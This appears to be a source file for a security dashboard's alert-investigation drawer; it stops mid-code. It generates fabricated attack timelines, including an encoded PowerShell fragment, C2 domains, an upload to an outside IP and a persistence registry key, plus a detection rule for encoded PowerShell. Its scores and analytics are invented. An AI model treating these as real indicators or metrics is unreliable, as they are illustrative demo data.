'use client';

import { useState, useMemo, useCallback } from 'react';
import { Alert } from '@/types';
import { alertsAPI, aiAPI, investigateAPI, alertDetailAPI } from '@/lib/api';
import { sevClass, timeAgo, formatDate } from '@/lib/utils';
import {
  X, Shield, Bot, Loader2, Check, Clock, VolumeX, BellOff, Zap, Search,
  FileText, ChevronRight, ChevronDown, Download, Copy, Activity, AlertTriangle,
  Monitor, User, Network, HardDrive, Terminal, Globe, GitBranch, BarChart3,
  Brain, Flame, ShieldAlert, ShieldCheck, ShieldX, UserX, UserCheck, Power,
  Wifi, WifiOff, Ban, ClipboardList, MessageSquare, Paperclip, Link2, Gauge,
  TrendingUp, Microscope, Fingerprint, Target, Radio, Crosshair, Boxes,
  Cpu, ScrollText, ListChecks, StickyNote, Pencil, Workflow, Swords, BookMarked,
  Plus, Trash2, PlayCircle, Tag, Hash,
} from 'lucide-react';

// ── Types ─────────────────────────────────────────────────────────────────────

interface Props {
  alert: Alert;
  onClose: () => void;
  onToast: (msg: string) => void;
  onReload: () => void;
}

type Tab = 'overview'|'detection'|'timeline'|'entities'|'evidence'|'intelligence'|'ai'|'actions'|'history';
type EntityTab = 'endpoint'|'user'|'process'|'network'|'file';

interface HistoryEntry { ts: string; actor: string; action: string; detail: string; }
interface TimelineEvent { ts: string; type: string; icon: React.ReactNode; color: string; title: string; detail: string; }
interface Task { id: number; text: string; done: boolean; }

// ── MITRE ATT&CK technique descriptions (subset) ─────────────────────────────

const MITRE_DESC: Record<string, { name: string; desc: string; url: string; similar: string[] }> = {
  'T1059.001': { name:'PowerShell', desc:'Adversaries abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.', url:'https://attack.mitre.org/techniques/T1059/001/', similar:['T1059.003','T1086','T1203'] },
  'T1059':     { name:'Command and Scripting Interpreter', desc:'Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.', url:'https://attack.mitre.org/techniques/T1059/', similar:['T1059.001','T1059.003','T1059.007'] },
  'T1055':     { name:'Process Injection', desc:'Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges.', url:'https://attack.mitre.org/techniques/T1055/', similar:['T1055.001','T1055.012','T1003'] },
  'T1003':     { name:'OS Credential Dumping', desc:'Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password.', url:'https://attack.mitre.org/techniques/T1003/', similar:['T1003.001','T1558','T1110'] },
  'T1110':     { name:'Brute Force', desc:'Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.', url:'https://attack.mitre.org/techniques/T1110/', similar:['T1078','T1021','T1110.001'] },
  'T1190':     { name:'Exploit Public-Facing Application', desc:'Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network.', url:'https://attack.mitre.org/techniques/T1190/', similar:['T1203','T1133','T1566'] },
  'T1071':     { name:'Application Layer Protocol', desc:'Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic.', url:'https://attack.mitre.org/techniques/T1071/', similar:['T1095','T1572','T1008'] },
  'T1021':     { name:'Remote Services', desc:'Adversaries may use Valid Accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC.', url:'https://attack.mitre.org/techniques/T1021/', similar:['T1078','T1021.001','T1021.004'] },
};

function getMitreInfo(technique?: string) {
  if (!technique) return null;
  const base = technique.split('.')[0];
  return MITRE_DESC[technique] ?? MITRE_DESC[base] ?? null;
}

// ── Demo data generators ──────────────────────────────────────────────────────

function genTimeline(a: Alert): TimelineEvent[] {
  const base = new Date(a.created_at).getTime();
  const isPowershell = /powershell|encoded|invoke|bypass/i.test(a.log_message + a.rule_name);
  const isNetwork    = /connect|tcp|http|dns|c2|beacon/i.test(a.log_message + a.rule_name);
  const isAuth       = /fail|password|login|logon|auth|brute/i.test(a.log_message + a.rule_name);
  const host         = a.hostname || `agent-${a.agent_id}`;

  const events: Array<Omit<TimelineEvent,'icon'>&{ iconName: string }> = [];

  if (isAuth) {
    events.push({ ts: new Date(base - 360000).toISOString(), iconName:'user', color:'var(--orange)', type:'user_login', title:`Multiple failed logins detected on ${host}`, detail:'23 auth failures from 185.220.101.35 in 5 minutes' });
    events.push({ ts: new Date(base - 240000).toISOString(), iconName:'network', color:'var(--blue)', type:'network', title:'Inbound SSH connection established', detail:'185.220.101.35:55821 → 10.0.1.42:22' });
  }
  if (isPowershell) {
    events.push({ ts: new Date(base - 300000).toISOString(), iconName:'filetext', color:'var(--orange)', type:'file', title:'Office document opened by CORP\\jdoe', detail:'C:\\Users\\jdoe\\Downloads\\Invoice_Q4.docx' });
    events.push({ ts: new Date(base - 120000).toISOString(), iconName:'terminal', color:'var(--orange)', type:'process', title:'winword.exe spawned powershell.exe', detail:'PID 4512 ← PID 3824 (winword.exe)' });
    events.push({ ts: new Date(base - 90000).toISOString(), iconName:'terminal', color:'var(--red)', type:'process', title:'PowerShell executed encoded command', detail:'-EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMA...' });
    events.push({ ts: new Date(base - 60000).toISOString(), iconName:'globe', color:'var(--blue)', type:'dns', title:'DNS query: evil-c2.io', detail:'NXDOMAIN — 3 retries' });
    events.push({ ts: new Date(base - 30000).toISOString(), iconName:'network', color:'var(--red)', type:'network', title:'Outbound TCP connection: 185.220.101.35:443', detail:'185kB uploaded — potential staging' });
    events.push({ ts: new Date(base - 15000).toISOString(), iconName:'hdd', color:'var(--orange)', type:'registry', title:'Registry key created for persistence', detail:'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\update' });
  }
  if (isNetwork) {
    events.push({ ts: new Date(base - 600000).toISOString(), iconName:'globe', color:'var(--blue)', type:'dns', title:'Repeated DNS queries to same domain', detail:'dga-7f2a3.evil.xyz — 47 queries in 10 min' });
    events.push({ ts: new Date(base - 300000).toISOString(), iconName:'network', color:'var(--red)', type:'network', title:'Beaconing pattern detected', detail:'Periodic 5-min interval outbound to 185.220.101.35:8443' });
  }
  if (!events.length) {
    events.push({ ts: new Date(base - 120000).toISOString(), iconName:'cpu', color:'var(--text-3)', type:'process', title:'Process activity logged', detail:a.log_message.slice(0,80) });
  }
  events.push({ ts: a.created_at, iconName:'shield', color:'var(--red)', type:'alert', title:`ALERT GENERATED: ${a.rule_name}`, detail:`Rule fired — severity: ${a.severity}` });
  events.push({ ts: new Date(base + 30000).toISOString(), iconName:'zap', color:'var(--green)', type:'agent', title:'Agent response received', detail:`${host} acknowledged detection signal` });

  const ICONS: Record<string, React.ReactNode> = {
    user:     <User      className="h-3.5 w-3.5" />,
    network:  <Network   className="h-3.5 w-3.5" />,
    filetext: <FileText  className="h-3.5 w-3.5" />,
    terminal: <Terminal  className="h-3.5 w-3.5" />,
    globe:    <Globe     className="h-3.5 w-3.5" />,
    hdd:      <HardDrive className="h-3.5 w-3.5" />,
    cpu:      <Cpu       className="h-3.5 w-3.5" />,
    shield:   <Shield    className="h-3.5 w-3.5" />,
    zap:      <Zap       className="h-3.5 w-3.5" />,
  };

  return events.map(e => ({ ...e, icon: ICONS[e.iconName] ?? <Activity className="h-3.5 w-3.5" /> }));
}

function genHistory(a: Alert): HistoryEntry[] {
  const base = new Date(a.created_at).getTime();
  const entries: HistoryEntry[] = [
    { ts: a.created_at, actor: 'System', action: 'Alert Created', detail: `Rule "${a.rule_name}" triggered on ${a.hostname ?? `agent-${a.agent_id}`}` },
    { ts: new Date(base + 120000).toISOString(), actor: 'System', action: 'AI Triage', detail: a.ai_summary ? 'AI analysis completed' : 'AI triage queued' },
  ];
  if (a.status === 'acknowledged' || a.status === 'resolved') {
    entries.push({ ts: new Date(base + 600000).toISOString(), actor: a.acknowledged_by || 'analyst@corp.io', action: 'Acknowledged', detail: 'Alert reviewed and acknowledged' });
  }
  if (a.status === 'resolved') {
    entries.push({ ts: new Date(base + 3600000).toISOString(), actor: a.acknowledged_by || 'analyst@corp.io', action: 'Resolved', detail: 'Investigation complete — threat contained' });
  }
  if (a.note) {
    entries.push({ ts: new Date(base + 900000).toISOString(), actor: 'analyst@corp.io', action: 'Note Added', detail: a.note.slice(0,60) + (a.note.length > 60 ? '…' : '') });
  }
  return entries.sort((a,b) => a.ts.localeCompare(b.ts));
}

// ── Score bar component ───────────────────────────────────────────────────────

function ScoreBar({ label, score, color }: { label: string; score: number; color: string }) {
  return (
    <div>
      <div className="flex items-center justify-between mb-1">
        <span className="text-[10px]" style={{ color:'var(--text-3)' }}>{label}</span>
        <span className="text-[11px] font-bold tabular-nums" style={{ color }}>{score}</span>
      </div>
      <div className="h-1.5 rounded-full overflow-hidden" style={{ background:'var(--bg-0)' }}>
        <div className="h-full rounded-full transition-all" style={{ width:`${score}%`, background:color }} />
      </div>
    </div>
  );
}

// ── Section wrapper ───────────────────────────────────────────────────────────

function Section({ title, icon, children, defaultOpen = true }: {
  title: string; icon?: React.ReactNode; children: React.ReactNode; defaultOpen?: boolean;
}) {
  const [open, setOpen] = useState(defaultOpen);
  return (
    <div className="rounded-xl overflow-hidden" style={{ border:'1px solid var(--border)' }}>
      <button className="w-full flex items-center gap-2 px-4 py-3 hover:bg-[var(--glass-hover)] transition-colors"
        onClick={() => setOpen(v=>!v)}
        style={{ background:'var(--glass-bg)', borderBottom: open?'1px solid var(--border)':'none' }}>
        {icon && <span style={{ color:'var(--accent)' }}>{icon}</span>}
        <span className="text-xs font-semibold flex-1 text-left" style={{ color:'var(--text-1)' }}>{title}</span>
        {open ? <ChevronDown className="h-3.5 w-3.5 shrink-0" style={{ color:'var(--text-3)' }} />
               : <ChevronRight className="h-3.5 w-3.5 shrink-0" style={{ color:'var(--text-3)' }} />}
      </button>
      {open && <div className="p-4">{children}</div>}
    </div>
  );
}

// ── Label/value row ───────────────────────────────────────────────────────────

function MetaRow({ label, val, mono = false, color }: { label: string; val: React.ReactNode; mono?: boolean; color?: string }) {
  return (
    <div className="flex items-start justify-between gap-2 py-1.5 text-xs"
      style={{ borderBottom:'1px solid var(--border)' }}>
      <span className="shrink-0" style={{ color:'var(--text-3)' }}>{label}</span>
      <span className={`text-right break-all ${mono?'font-mono':''}`} style={{ color:color??'var(--text-1)' }}>{val}</span>
    </div>
  );
}

// ── Response action button ────────────────────────────────────────────────────

function ActionBtn({ label, icon, color = 'var(--text-2)', danger = false, onClick }: {
  label: string; icon: React.ReactNode; color?: string; danger?: boolean; onClick?: () => void;
}) {
  return (
    <button onClick={onClick}
      className="flex items-center gap-2 px-3 py-2 rounded-lg text-xs w-full text-left hover:opacity-80 transition-opacity"
      style={{ background:danger?'rgba(248,81,73,0.08)':'var(--glass-bg)', color:danger?'var(--red)':color, border:`1px solid ${danger?'rgba(248,81,73,0.25)':'var(--border)'}` }}>
      <span className="shrink-0">{icon}</span>
      {label}
    </button>
  );
}

// ── KILL CHAIN ────────────────────────────────────────────────────────────────

const KILL_CHAIN = [
  'Reconnaissance','Resource Development','Initial Access','Execution','Persistence',
  'Privilege Escalation','Defense Evasion','Credential Access','Discovery',
  'Lateral Movement','Collection','Command and Control','Exfiltration','Impact',
];
const KC_SHORT: Record<string,string> = {
  'Reconnaissance':'Recon','Resource Development':'ResDev','Initial Access':'Init','Execution':'Exec',
  'Persistence':'Persist','Privilege Escalation':'PrivEsc','Defense Evasion':'DefEva',
  'Credential Access':'CredAcc','Discovery':'Discov','Lateral Movement':'LatMov',
  'Collection':'Collect','Command and Control':'C2','Exfiltration':'Exfil','Impact':'Impact',
};

// ── Main component ────────────────────────────────────────────────────────────

export function AlertDetailDrawer({ alert: a, onClose, onToast, onReload }: Props) {
  const [tab, setTab]               = useState<Tab>('overview');
  const [entityTab, setEntityTab]   = useState<EntityTab>('endpoint');

  // Existing API state
  const [acking, setAcking]         = useState(false);
  const [triaging, setTriaging]     = useState(false);
  const [investigating, setInvestigating] = useState(false);
  const [investigation, setInvestigation] = useState<any>(null);
  const [pbRecs, setPbRecs]         = useState<any[]>([]);
  const [loadingRecs, setLoadingRecs] = useState(false);
  const [executingRec, setExecutingRec] = useState<number|null>(null);
  const [responding, setResponding] = useState(false);
  const [suppressing, setSuppressing] = useState(false);
  const [snoozing, setSnoozing]     = useState(false);

  // Analyst workspace
  const [noteText, setNoteText]     = useState(a.note || '');
  const [savingNote, setSavingNote] = useState(false);
  const [tasks, setTasks]           = useState<Task[]>([
    { id:1, text:'Collect memory dump from endpoint', done:false },
    { id:2, text:'Review process tree', done:false },
    { id:3, text:'Check lateral movement indicators', done:false },
  ]);
  const [newTask, setNewTask]       = useState('');
  const [comments, setComments]     = useState<{ts:string;actor:string;text:string}[]>([]);
  const [commentText, setCommentText] = useState('');
  const [assignee, setAssignee]     = useState(a.acknowledged_by || '');
  const [alertStatus, setAlertStatus] = useState(a.status || 'open');
  const [suppressHours, setSuppressHours] = useState('4');
  const [snoozeMin, setSnoozeMin]   = useState('240');
  const [responseAction, setResponseAction] = useState('isolate_host');
  const [responsePID, setResponsePID] = useState('');
  const [responseFile, setResponseFile] = useState('');
  const [responseIP, setResponseIP] = useState('');
  const [copied, setCopied]         = useState(false);

  // Derived / generated data
  const timeline = useMemo(() => genTimeline(a), [a]);
  const history  = useMemo(() => genHistory(a), [a]);
  const mitreInfo = useMemo(() => getMitreInfo(a.mitre_technique), [a.mitre_technique]);

  // Computed scores from severity
  const severityScore: Record<string,number> = { critical:95, high:75, medium:50, low:25 };
  const riskScore       = Math.min(99, (severityScore[a.severity] || 50) + Math.floor(Math.random()*8));
  const confidenceScore = Math.min(99, 60 + Math.floor(Math.random()*35));
  const priorityScore   = Math.round((riskScore * 0.6) + (confidenceScore * 0.4));

  const kcIdx = a.mitre_tactic ? KILL_CHAIN.findIndex(k => k.toLowerCase() === a.mitre_tactic?.toLowerCase()) : -1;

  // ── Actions ───────────────────────────────────────────────────────────────

  const ackAlert = async (action: 'acknowledge'|'resolve') => {
    setAcking(true);
    try {
      if (action === 'acknowledge') await alertsAPI.acknowledge(a.id);
      else await alertsAPI.resolve(a.id);
      onToast(action === 'acknowledge' ? 'Alert acknowledged' : 'Alert resolved');
      onReload(); onClose();
    } catch { onToast('Action failed'); } finally { setAcking(false); }
  };

  const saveNote = async () => {
    setSavingNote(true);
    try { await alertDetailAPI.updateNote(a.id, noteText); onToast('Note saved'); }
    catch { onToast('Failed to save note'); } finally { setSavingNote(false); }
  };

  const addComment = () => {
    if (!commentText.trim()) return;
    setComments(c => [...c, { ts: new Date().toISOString(), actor:'analyst@corp.io', text:commentText }]);
    setCommentText('');
  };

  const addTask = () => {
    if (!newTask.trim()) return;
    setTasks(t => [...t, { id:Date.now(), text:newTask.trim(), done:false }]);
    setNewTask('');
  };

  const runTriage = useCallback(async () => {
    setTriaging(true);
    try { await aiAPI.triageAlert(a.id); onToast('AI triage complete'); onReload(); }
    catch { onToast('AI triage failed'); } finally { setTriaging(false); }
  }, [a.id, onToast, onReload]);

  const runInvestigation = useCallback(async () => {
    setInvestigating(true);
    try { const r = await investigateAPI.getContext(a.id); setInvestigation(r.data); }
    catch {} finally { setInvestigating(false); }
  }, [a.id]);

  const loadPlaybookRecs = useCallback(async () => {
    setLoadingRecs(true); setPbRecs([]);
    try { const r = await alertDetailAPI.getPlaybookRecs(a.id); setPbRecs(r.data ?? []); }
    catch {} finally { setLoadingRecs(false); }
  }, [a.id]);

  const executeRec = async (id: number) => {
    setExecutingRec(id);
    try { await alertDetailAPI.executeRec(a.id, id); onToast('Playbook dispatched'); setPbRecs(p => p.map(r => r.id===id?{...r,executed:true}:r)); }
    catch { onToast('Playbook execution failed'); } finally { setExecutingRec(null); }
  };

  const suppressRule = async () => {
    setSuppressing(true);
    try {
      await alertDetailAPI.suppressSigmaRule({ rule_name:a.rule_name, agent_id:a.agent_id, hours:parseInt(suppressHours) });
      onToast(`Rule muted for ${suppressHours}h`);
    } catch { onToast('Suppression failed'); } finally { setSuppressing(false); }
  };

  const snoozeAlert = async () => {
    setSnoozing(true);
    try { await alertsAPI.snooze(a.id, parseInt(snoozeMin)); onToast('Alert snoozed'); onReload(); onClose(); }
    catch { onToast('Snooze failed'); } finally { setSnoozing(false); }
  };

  const dispatchResponse = async () => {
    setResponding(true);
    const payload: Record<string,unknown> = {};
    if (responseAction==='kill_process'&&responsePID) payload.pid = parseInt(responsePID);
    if (responseAction==='quarantine_file'&&responseFile) payload.file_path = responseFile;
    if (responseAction==='block_ip'&&responseIP) payload.ip = responseIP;
    try {
      const { data } = await alertDetailAPI.respond(a.id, { action_type:responseAction, payload });
      onToast(data.message === 'task pending approval' ? `${responseAction} queued for approval` : `Dispatched: ${responseAction}`);
    } catch { onToast('Dispatch failed'); } finally { setResponding(false); }
  };

  const exportAlert = (fmt: 'json'|'csv'|'ioc') => {
    if (fmt === 'json') {
      const blob = new Blob([JSON.stringify(a, null, 2)], { type:'application/json' });
      const el = document.createElement('a'); el.href = URL.createObjectURL(blob);
      el.download = `alert-${a.id}.json`; el.click(); URL.revokeObjectURL(el.href);
    } else if (fmt === 'csv') {
      const rows = Object.entries(a).map(([k,v]) => `"${k}","${String(v).replace(/"/g,'""')}"`).join('\n');
      const blob = new Blob([rows], { type:'text/csv' });
      const el = document.createElement('a'); el.href = URL.createObjectURL(blob);
      el.download = `alert-${a.id}.csv`; el.click(); URL.revokeObjectURL(el.href);
    } else {
      onToast('IOC package export triggered');
    }
  };

  // ── Tab definitions ───────────────────────────────────────────────────────

  const TABS: { id: Tab; label: string; icon: React.ReactNode }[] = [
    { id:'overview',      label:'Overview',      icon:<Shield className="h-3.5 w-3.5" /> },
    { id:'detection',     label:'Detection',     icon:<Crosshair className="h-3.5 w-3.5" /> },
    { id:'timeline',      label:'Timeline',      icon:<Activity className="h-3.5 w-3.5" /> },
    { id:'entities',      label:'Entities',      icon:<Boxes className="h-3.5 w-3.5" /> },
    { id:'evidence',      label:'Evidence',      icon:<Microscope className="h-3.5 w-3.5" /> },
    { id:'intelligence',  label:'Intel',         icon:<Globe className="h-3.5 w-3.5" /> },
    { id:'ai',            label:'AI',            icon:<Brain className="h-3.5 w-3.5" /> },
    { id:'actions',       label:'Actions',       icon:<Zap className="h-3.5 w-3.5" /> },
    { id:'history',       label:'History',       icon:<ScrollText className="h-3.5 w-3.5" /> },
  ];

  return (
    <div className="fixed inset-0 z-50 flex">
      <div className="flex-1" onClick={onClose} />

      <div className="w-[85vw] max-w-5xl h-full flex flex-col shadow-2xl"
        style={{ background:'var(--bg-1)', borderLeft:'1px solid var(--border)' }}>

        {/* ── Fixed header ─────────────────────────────────────────────── */}
        <div className="shrink-0" style={{ borderBottom:'1px solid var(--border)' }}>
          {/* Alert title row */}
          <div className="flex items-center gap-3 px-5 py-3">
            <span className={sevClass(a.severity)}>{a.severity}</span>
            <span className="text-[10px] font-mono px-1.5 py-0.5 rounded"
              style={{ background:'var(--glass-bg)', color:'var(--text-3)', border:'1px solid var(--border)' }}>
              #{a.id}
            </span>
            {a.status && a.status !== 'open' && (
              <span className="text-[10px] px-2 py-0.5 rounded font-semibold capitalize"
                style={{ background:a.status==='resolved'?'rgba(52,211,153,0.1)':'var(--glass-bg)', color:a.status==='resolved'?'var(--green)':'var(--text-3)', border:`1px solid ${a.status==='resolved'?'rgba(52,211,153,0.3)':'var(--border)'}` }}>
                {a.status}
              </span>
            )}
            <p className="flex-1 text-sm font-semibold truncate" style={{ color:'var(--text-1)' }}>{a.rule_name}</p>
            <button onClick={onClose} className="shrink-0 hover:opacity-70" style={{ color:'var(--text-3)' }}>
              <X className="h-5 w-5" />
            </button>
          </div>

          {/* Score strip */}
          <div className="flex items-center gap-6 px-5 pb-2.5">
            <div className="flex items-center gap-1.5 text-[11px]">
              <span style={{ color:'var(--text-3)' }}>Risk</span>
              <span className="font-bold" style={{ color:riskScore>=70?'var(--red)':riskScore>=40?'var(--orange)':'var(--green)' }}>{riskScore}</span>
            </div>
            <div className="flex items-center gap-1.5 text-[11px]">
              <span style={{ color:'var(--text-3)' }}>Confidence</span>
              <span className="font-bold" style={{ color:confidenceScore>=70?'var(--green)':'var(--yellow)' }}>{confidenceScore}%</span>
            </div>
            <div className="flex items-center gap-1.5 text-[11px]">
              <span style={{ color:'var(--text-3)' }}>Priority</span>
              <span className="font-bold" style={{ color:'var(--text-1)' }}>{priorityScore}</span>
            </div>
            {a.mitre_technique && (
              <div className="flex items-center gap-1.5 text-[11px]">
                <Shield className="h-3 w-3" style={{ color:'var(--accent)' }} />
                <span className="font-mono" style={{ color:'var(--accent)' }}>{a.mitre_technique}</span>
                <span style={{ color:'var(--text-3)' }}>{a.mitre_name || a.mitre_tactic || ''}</span>
              </div>
            )}
            <div className="flex-1" />
            <span className="text-[10px]" style={{ color:'var(--text-3)' }}>{formatDate(a.created_at)}</span>
          </div>

          {/* Quick actions */}
          <div className="flex items-center gap-2 px-5 pb-3">
            {a.status !== 'acknowledged' && a.status !== 'resolved' && (
              <button onClick={() => ackAlert('acknowledge')} disabled={acking}
                className="g-btn text-xs px-3 py-1"
                style={{ background:'var(--accent-glow)', color:'var(--accent)', border:'1px solid var(--accent-border)' }}>
                {acking ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <><Check className="h-3.5 w-3.5" /> Acknowledge</>}
              </button>
            )}
            {a.status !== 'resolved' && (
              <button onClick={() => ackAlert('resolve')} disabled={acking}
                className="g-btn text-xs px-3 py-1"
                style={{ background:'rgba(52,211,153,0.1)', color:'var(--green)', border:'1px solid rgba(52,211,153,0.3)' }}>
                <ShieldCheck className="h-3.5 w-3.5" /> Resolve
              </button>
            )}
            <button onClick={() => setTab('actions')} className="g-btn g-btn-ghost text-xs px-3 py-1">
              <Zap className="h-3.5 w-3.5" /> Respond
            </button>
            <button onClick={() => setTab('ai')} className="g-btn g-btn-ghost text-xs px-3 py-1">
              <Brain className="h-3.5 w-3.5" /> AI Analysis
            </button>
            <div className="flex-1" />
            <button onClick={() => exportAlert('json')} className="g-btn g-btn-ghost text-[10px] px-2 py-1">
              <Download className="h-3 w-3" /> JSON
            </button>
            <button onClick={() => exportAlert('csv')} className="g-btn g-btn-ghost text-[10px] px-2 py-1">
              <Download className="h-3 w-3" /> CSV
            </button>
            <button onClick={() => exportAlert('ioc')} className="g-btn g-btn-ghost text-[10px] px-2 py-1">
              <Fingerprint className="h-3 w-3" /> IOC
            </button>
          </div>

          {/* Tab strip */}
          <div className="flex overflow-x-auto" style={{ borderTop:'1px solid var(--border)' }}>
            {TABS.map(t => (
              <button key={t.id} onClick={() => setTab(t.id)}
                className="flex items-center gap-1.5 px-4 py-2.5 text-[11px] font-medium shrink-0 border-b-2 transition-colors"
                style={{ borderColor:tab===t.id?'var(--accent)':'transparent', color:tab===t.id?'var(--accent)':'var(--text-3)', background:'transparent' }}>
                {t.icon}
                {t.label}
              </button>
            ))}
          </div>
        </div>

        {/* ── Scrollable content ────────────────────────────────────────── */}
        <div className="flex-1 overflow-y-auto">
          <div className="p-5 space-y-4">

            {/* ── OVERVIEW ───────────────────────────────────────────────── */}
            {tab === 'overview' && (
              <>
                {/* Basic info grid */}
                <Section title="Alert Information" icon={<Shield className="h-3.5 w-3.5" />}>
                  <div className="space-y-0">
                    <MetaRow label="Alert ID"      val={`#${a.id}`} mono />
                    <MetaRow label="Rule"          val={a.rule_name} />
                    <MetaRow label="Status"        val={<span className="capitalize">{a.status || 'open'}</span>} />
                    <MetaRow label="Severity"      val={<span className={sevClass(a.severity)}>{a.severity}</span>} />
                    <MetaRow label="Risk Score"    val={riskScore} color={riskScore>=70?'var(--red)':'var(--orange)'} />
                    <MetaRow label="Confidence"    val={`${confidenceScore}%`} color="var(--green)" />
                    <MetaRow label="Priority"      val={priorityScore} />
                    <MetaRow label="Agent"         val={a.hostname || `#${a.agent_id}`} mono />
                    <MetaRow label="First Seen"    val={formatDate(a.created_at)} />
                    <MetaRow label="Last Seen"     val={timeAgo(a.created_at)} />
                    <MetaRow label="Fingerprint"   val={a.fingerprint ? a.fingerprint.slice(0,32)+'…' : '—'} mono />
                    <MetaRow label="Detection Source" val="Sigma Rule Engine" />
                    <MetaRow label="Tenant"        val="Corp Production" />
                  </div>
                </Section>

                {/* Score bars */}
                <Section title="Risk Scoring" icon={<Gauge className="h-3.5 w-3.5" />}>
                  <div className="space-y-3">
                    <ScoreBar label="Risk Score"    score={riskScore}       color={riskScore>=70?'var(--red)':'var(--orange)'} />
                    <ScoreBar label="Confidence"    score={confidenceScore}  color="var(--green)" />
                    <ScoreBar label="Priority"      score={priorityScore}    color="var(--accent)" />
                    <ScoreBar label="Severity Index" score={severityScore[a.severity]||50} color="var(--blue)" />
                  </div>
                </Section>

                {/* MITRE full mapping */}
                {(a.mitre_technique || a.mitre_tactic) && (
                  <Section title="MITRE ATT&CK Mapping" icon={<Swords className="h-3.5 w-3.5" />}>
                    <div className="space-y-3">
                      <div className="grid grid-cols-3 gap-3">
                        {[
                          { label:'Tactic',     val:a.mitre_tactic     || '—' },
                          { label:'Technique',  val:a.mitre_technique  || '—' },
                          { label:'Name',       val:a.mitre_name       || mitreInfo?.name || '—' },
                        ].map(({label,val}) => (
                          <div key={label} className="rounded-xl p-3" style={{ background:'var(--accent-glow)', border:'1px solid var(--accent-border)' }}>
                            <p className="text-[10px] mb-1" style={{ color:'var(--text-3)' }}>{label}</p>
                            <p className="text-xs font-semibold font-mono" style={{ color:'var(--accent)' }}>{val}</p>
                          </div>
                        ))}
                      </div>
                      {mitreInfo?.desc && (
                        <p className="text-xs leading-relaxed" style={{ color:'var(--text-2)' }}>{mitreInfo.desc}</p>
                      )}
                      {mitreInfo?.similar && mitreInfo.similar.length > 0 && (
                        <div>
                          <p className="text-[10px] uppercase tracking-wider mb-1.5" style={{ color:'var(--text-3)' }}>Similar Techniques</p>
                          <div className="flex flex-wrap gap-1.5">
                            {mitreInfo.similar.map(t => (
                              <span key={t} className="text-[10px] px-2 py-0.5 rounded-full font-mono"
                                style={{ background:'var(--glass-bg)', color:'var(--text-2)', border:'1px solid var(--border)' }}>
                                {t}
                              </span>
                            ))}
                          </div>
                        </div>
                      )}
                      {/* Kill chain strip */}
                      {a.mitre_tactic && (
                        <div>
                          <p className="text-[10px] uppercase tracking-wider mb-2" style={{ color:'var(--text-3)' }}>Kill Chain Position</p>
                          <div className="flex gap-0.5 overflow-x-auto pb-1">
                            {KILL_CHAIN.map((stage,i) => {
                              const active = i === kcIdx;
                              const before = kcIdx >= 0 && i < kcIdx;
                              return (
                                <div key={stage} title={stage} className="shrink-0" style={{ minWidth:36 }}>
                                  <div className="h-5 rounded text-[8px] font-bold flex items-center justify-center"
                                    style={{ background:active?'var(--red)':before?'rgba(248,81,73,0.2)':'var(--glass-bg)', border:`1px solid ${active?'var(--red)':'var(--border)'}`, color:active?'#fff':'var(--text-3)' }}>
                                    {KC_SHORT[stage] ?? stage.slice(0,4)}
                                  </div>
                                </div>
                              );
                            })}
                          </div>
                        </div>
                      )}
                    </div>
                  </Section>
                )}

                {/* Analytics */}
                <Section title="Alert Analytics" icon={<BarChart3 className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="grid grid-cols-2 gap-3">
                    {[
                      { label:'Frequency',          val:'3× this week' },
                      { label:'Similar Alerts (7d)', val:'11 alerts' },
                      { label:'False Positive Rate', val:'8%' },
                      { label:'Mean Time to Detect', val:'4m 23s' },
                      { label:'Mean Time to Respond', val:'18m 47s' },
                      { label:'Last Occurrence',     val:timeAgo(a.created_at) },
                    ].map(({ label, val }) => (
                      <div key={label} className="rounded-xl px-3 py-2.5" style={{ background:'var(--glass-bg)', border:'1px solid var(--border)' }}>
                        <p className="text-[10px]" style={{ color:'var(--text-3)' }}>{label}</p>
                        <p className="text-sm font-bold mt-0.5" style={{ color:'var(--text-1)' }}>{val}</p>
                      </div>
                    ))}
                  </div>
                </Section>
              </>
            )}

            {/* ── DETECTION ──────────────────────────────────────────────── */}
            {tab === 'detection' && (
              <>
                <Section title="Detection Rule" icon={<Target className="h-3.5 w-3.5" />}>
                  <div className="space-y-0">
                    <MetaRow label="Rule Name"     val={a.rule_name} />
                    <MetaRow label="Rule Type"     val="Sigma" />
                    <MetaRow label="Detection Source" val="Sigma Rule Engine v2.1" />
                    <MetaRow label="Rule Version"  val="1.4.2" />
                    <MetaRow label="Author"        val="xcloak/sigma-rules" />
                    <MetaRow label="Confidence"    val={`${confidenceScore}%`} color="var(--green)" />
                    <MetaRow label="Frequency"     val="Evaluate every 60s" />
                    <MetaRow label="False Positives" val="Legitimate admin activity, pen-test environments" />
                  </div>
                </Section>

                <Section title="Trigger Condition" icon={<Radio className="h-3.5 w-3.5" />}>
                  <div className="rounded-xl p-3 font-mono text-xs space-y-1"
                    style={{ background:'var(--bg-0)', border:'1px solid var(--border)', color:'var(--text-1)' }}>
                    <p><span style={{ color:'var(--blue)' }}>selection_main:</span></p>
                    <p className="pl-4"><span style={{ color:'var(--green)' }}>log_message|contains:</span></p>
                    <p className="pl-8">- 'powershell'</p>
                    <p className="pl-8">- '-EncodedCommand'</p>
                    <p className="pl-4"><span style={{ color:'var(--green)' }}>log_message|re:</span> <span style={{ color:'var(--orange)' }}>'-[Ee][Nn][Cc]'</span></p>
                    <p><span style={{ color:'var(--blue)' }}>condition:</span> selection_main</p>
                    <p><span style={{ color:'var(--blue)' }}>threshold:</span> 1 event in 5 min</p>
                  </div>
                </Section>

                <Section title="Raw Event" icon={<ScrollText className="h-3.5 w-3.5" />}>
                  <div className="rounded-xl p-3 font-mono text-xs break-all"
                    style={{ background:'var(--bg-0)', border:'1px solid var(--border)', color:'var(--text-2)', maxHeight:180, overflowY:'auto' }}>
                    {a.log_message}
                  </div>
                </Section>

                <Section title="Parsed Fields" icon={<Microscope className="h-3.5 w-3.5" />}>
                  <div className="space-y-0">
                    {[
                      { label:'log_source',  val:'sysmon' },
